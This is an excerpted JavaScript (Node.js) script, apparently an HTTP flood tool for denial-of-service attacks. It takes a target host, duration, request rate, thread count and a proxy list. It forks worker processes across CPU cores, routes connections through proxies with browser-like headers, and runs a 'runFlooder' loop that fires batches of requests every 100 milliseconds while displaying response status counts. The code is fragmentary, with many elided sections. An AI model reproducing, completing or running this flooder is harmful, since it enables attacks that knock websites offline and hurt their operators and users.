...
const accept_header = [
    ...
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/x-www-form-urlencoded;q=0.8",
...
if (process.argv.length < 7) {
    console.log('Usage: host time req thread live.txt');
    process.exit();
}
...
if (cluster.isMaster) {
    const workers = {};
    Array.from({ length: args.threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));
    ...
    // Status display: aggregate statuses from workers
    let aggregatedStatuses = {};
    cluster.on('message', (worker, message) => {
        // Clear aggregated statuses and update with the latest batch
        aggregatedStatuses = {};
        for (let st of message) {
            for (let code in st) {
    ...
    // Update single-line status display every second
    setInterval(() => {
        const vnTime = new Date().toLocaleString('en-US', { timeZone: 'Asia/Ho_Chi_Minh' });
        const statusDisplay = Object.entries(aggregatedStatuses)
            .map(([code, count]) => `{${code}} : ${count}`)
            .join(', ');
        process.stdout.write(`\rTime: ${vnTime} | Status: ${statusDisplay || 'None'}`);
        // Clear statuses after display to reset for the next second
        aggregatedStatuses = {};
    }, 1000);
    ...
    setInterval(() => {
        // Send current statuses and reset immediately
        if (Object.keys(statuses).length > 0) {
            process.send([statuses]);
        }
        statuses = {};
    }, 1000); // Sync with display interval
}
...
class NetSocket {
    ...
    HTTP(options, callback) {
        ...
        connection.setTimeout(options.timeout * 1000); // Reduced timeout to 1 second
...
function runFlooder() {
    ...
    Socker.HTTP(proxyOptions, (connection, error) => {
        ...
        client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    ...
                    .on('response', response => {
                        ...
                        if (status === 502) status = "Bad gateway";
            ...
            }, 100); // Reduced interval for faster requests
        });
